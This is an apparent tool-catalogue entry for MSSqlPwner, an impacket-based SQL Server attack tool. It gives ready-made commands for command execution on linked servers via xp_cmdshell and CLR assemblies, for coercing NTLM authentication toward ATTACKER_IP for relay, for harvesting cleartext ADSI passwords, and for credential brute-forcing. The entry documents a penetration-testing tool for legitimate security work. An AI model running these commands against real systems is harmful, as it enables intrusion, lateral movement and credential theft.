---
name: "mssqlpwner"
categories:
  - database
homepage: "https://github.com/ScorpionesLabs/MSSqlPwner"
origin: "hacktricks"
recipe: "upstream"
packaged-by: []
build-system: python
github-repo: "ScorpionesLabs/MSSqlPwner"
github-stars: 470
github-match: "exact"
gh-checked: "2026-11-13"
worth: 6.2
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-13"
license: "custom:unknown"
---

# mssqlpwner

> Impacket-based MSSQL attack tool: enumerates linked-server and impersonation chains, then executes commands, relays NTLM, and harvests ADSI passwords across them.

## What it's for

MSSqlPwner (ScorpionesLabs) is a pentesting tool for Microsoft SQL Server built on impacket. It authenticates with passwords, NTLM hashes, or Kerberos tickets (Windows or MSSQL logins), then performs recursive enumeration of linked servers and impersonation contexts to compute every possible chain of execution — including chains that loop out through a linked server and back with higher privileges when the current context cannot run commands directly. Through the found chains it executes OS commands (`xp_cmdshell`, `sp_oacreate` Ole Automation, or a custom SQL CLR assembly), runs direct queries (`OpenQuery`/`EXEC AT`), coerces NTLM authentication for hash capture/relay via `xp_dirtree`/`xp_subdirs`/`xp_fileexist`, and pulls cleartext ADSI-provider passwords from linked Active Directory servers. It also brute-forces credentials (passwords, hashes, and Kerberos tickets in SPN form) across lists of hosts. It is not a SQL client replacement — for plain authenticated querying see [[impacket-mssqlclient]]; MSSqlPwner is the lateral-movement and chain-abuse layer.

No corpus evidence — derived from upstream documentation (README usage examples, verified against the packaged source's argument parser).

## Typical use cases

### Enter interactive mode

The main workflow: live exploration of everything the account can reach.

```
mssqlpwner corp.com/user:Passw0rd@target.example.com -windows-auth interactive
```

Outcome: opens the interactive console after enumerating linked servers and impersonation chains; inside it, `set-chain`, `set-link-server` and `rev2self` switch execution context through the discovered chains, and commands run live in the selected context. Authentication also accepts NTLM hashes (`-hashes :0CB6948805F797BF2A82807973B89537`) and Kerberos tickets; `-max-impersonation-depth` bounds the recursive search (default 10).

### Enumerate linked servers and execution chains

Map the attack surface before executing anything.

```
mssqlpwner corp.com/user:Passw0rd@target.example.com -windows-auth enumerate
```

Outcome: prints every linked server and the impersonation paths reachable from the current login, together with computed chains for command execution; `get-chain-list -filter-hostname SRV01` reprints just the chains touching a given host and `get-link-server-list` just the links — non-interactive one-shot variants of the same enumeration.

### Execute a command on a linked server

Run OS commands where the current server alone denies them.

```
mssqlpwner corp.com/user:Passw0rd@target.example.com -windows-auth -link-name SRV01 exec hostname
```

Outcome: runs `hostname` on the SRV01 linked server through `xp_cmdshell` (the default method) and prints its output; add `-command-execution-method sp_oacreate` for targets where Ole Automation is the available primitive (pass the whole command line, e.g. `"cmd /c whoami"`), or `-chain-id <id>` to route through a specific enumerated chain instead of a link name.

### Execute through a custom SQL CLR assembly

Fall back to custom assembly when stored procedures are blocked.

```
mssqlpwner corp.com/user:Passw0rd@target.example.com -windows-auth custom-asm hostname
```

Outcome: uploads and invokes a custom .NET assembly on the target and runs the command through it; `-procedure-name` selects the assembly entry point (`execute_command` by default, `run_query` to execute SQL, `run_query_system_service` to run queries as the SQL service account), and `inject-custom-asm custom.dll` loads your own assembly file instead of the built-in one.

### Coerce and relay NTLM authentication

Force the SQL service to authenticate to your relay server.

```
mssqlpwner corp.com/user:Passw0rd@target.example.com -windows-auth -link-name SRV01 ntlm-relay ATTACKER_IP
```

Outcome: triggers an SMB/NTLM authentication from the linked server toward ATTACKER_IP using `xp_dirtree` (default; `-relay-method xp_subdirs` and `xp_fileexist` are alternatives) — pair it with your relay/capture stack (ntlmrelayx, Responder); `-chain-id` targets any enumerated chain rather than a named link.

### Harvest ADSI provider passwords

Pull cleartext credentials from linked Active Directory servers.

```
mssqlpwner corp.com/user:Passw0rd@target.example.com -windows-auth -link-name DC01 retrieve-password
```

Outcome: abuses the linked server's ADSI providers to make them re-authenticate with cleartext credentials captured on your listener (default port 1389, `-listen-port` to change); `get-adsi-provider-list` enumerates the providers first and `-adsi-provider`/`-arch` pin one explicitly.

### Run a direct query

Query the target or a linked server without leaving the tool.

```
mssqlpwner corp.com/user:Passw0rd@target.example.com -windows-auth direct-query "SELECT CURRENT_USER"
```

Outcome: executes the SQL statement and prints the result set; `-query-method exec_at` switches from `OpenQuery` (default) to `EXEC (...) AT <linked>` semantics, and combined with `-link-name` the query runs on the linked server.

### Brute-force hosts with passwords, hashes or tickets

Spray MSSQL access across a subnet or host list.

```
mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt
```

Outcome: attempts every user/password pair from the files against every host in `hosts.txt`, printing successful logins; `-hl hashes.txt` swaps passwords for NTLM hashes and `-tl tickets.txt` for Kerberos tickets in SPN form (`MSSQLSvc/host.corp.example.com:1433`) — with tickets, no passwords or hashes are needed.
